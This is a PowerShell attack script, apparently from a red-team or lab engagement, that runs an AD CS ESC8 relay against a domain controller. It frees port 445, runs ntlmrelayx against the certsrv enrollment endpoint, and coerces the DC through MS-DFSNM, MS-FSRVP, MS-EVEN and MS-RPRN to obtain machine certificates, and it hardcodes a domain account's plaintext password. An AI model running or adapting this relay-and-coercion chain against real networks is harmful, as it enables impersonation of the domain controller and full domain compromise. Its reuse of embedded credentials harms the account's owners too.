# ESC8 coercion protocol test: try MS-DFSNM, MS-FSRVP, MS-EVEN, MS-RPRN against dc01
# with relay up on 445. Reports which protocol actually triggers a callback.
$ErrorActionPreference = "Stop"
$py = "C:\Users\analyst_t1.CHILD\AppData\Local\Programs\Python\Python312\Scripts"
$work = "C:\Tools\cadre-attack"
Set-Location $work

try {
  Write-Output "=== disable SMB stack ==="
  sc.exe config LanmanServer start= disabled | Out-Null
  sc.exe config srv2 start= disabled | Out-Null
  sc.exe config srvnet start= disabled | Out-Null
  Stop-Service LanmanServer -Force -ErrorAction SilentlyContinue
  sc.exe stop srv2 | Out-Null
  sc.exe stop srvnet | Out-Null
  Start-Sleep -Seconds 5
  $c = Get-NetTCPConnection -LocalPort 445 -State Listen -ErrorAction SilentlyContinue
  if ($c) { throw "445 still bound" }
  Write-Output "445_free"

  Write-Output "=== start relay on 445 ==="
  $relayLog = Join-Path $work "esc8-relay.log"
  Remove-Item $relayLog,(Join-Path $work "esc8-relay.err") -ErrorAction SilentlyContinue
  $relayArgs = "-t http://dc01.cadre.local/certsrv/certfnsh.asp --adcs --template Machine -smb2support -ip 192.168.77.62 -debug"
  $p = Start-Process -FilePath "python" -ArgumentList "$py\ntlmrelayx.py $relayArgs" -WorkingDirectory $work `
    -RedirectStandardOutput $relayLog -RedirectStandardError (Join-Path $work "esc8-relay.err") `
    -PassThru -WindowStyle Hidden
  Write-Output "relay_pid=$($p.Id)"
  Start-Sleep -Seconds 8

  $env:PYTHONIOENCODING = "utf-8"
  $coercerLog = Join-Path $work "esc8-coercer.log"

  foreach ($proto in "MS-DFSNM","MS-FSRVP","MS-EVEN","MS-RPRN") {
    Write-Output "=== coerce via $proto ==="
    Remove-Item $coercerLog -ErrorAction SilentlyContinue
    & "C:\Tools\RedStrike\.venv\Scripts\coercer.exe" coerce -u chief_command -p "C0mm@nd_Ch1ef!" -d cadre.local --dc-ip 192.168.77.10 -t 192.168.77.10 -l 192.168.77.62 --filter-protocol-name $proto --auth-type smb --always-continue 2>&1 | Out-File $coercerLog -Encoding UTF8 -Force
    Write-Output "coerce_rc=$LASTEXITCODE"
    Start-Sleep -Seconds 8
    Write-Output "--- relay log new lines ---"
    Get-Content $relayLog -Tail 15 -ErrorAction SilentlyContinue
  }

  Write-Output "=== relay log full ==="
  Get-Content $relayLog -ErrorAction SilentlyContinue
  Write-Output "--- relay stderr ---"
  Get-Content (Join-Path $work "esc8-relay.err") -Tail 15 -ErrorAction SilentlyContinue

  Write-Output "=== certs ==="
  Get-ChildItem $work -Filter "*.pfx" | Sort-Object LastWriteTime -Descending | Select-Object -First 6 | Format-Table Name,Length,LastWriteTime -AutoSize
} finally {
  Stop-Process -Name python -Force -ErrorAction SilentlyContinue
  Start-Sleep -Seconds 1
  sc.exe config LanmanServer start= auto | Out-Null
  sc.exe config srv2 start= demand | Out-Null
  sc.exe config srvnet start= demand | Out-Null
  sc.exe start srvnet | Out-Null
  sc.exe start srv2 | Out-Null
  Start-Sleep -Seconds 2
  Start-Service LanmanServer -ErrorAction SilentlyContinue
  Write-Output "smb_restored"
}
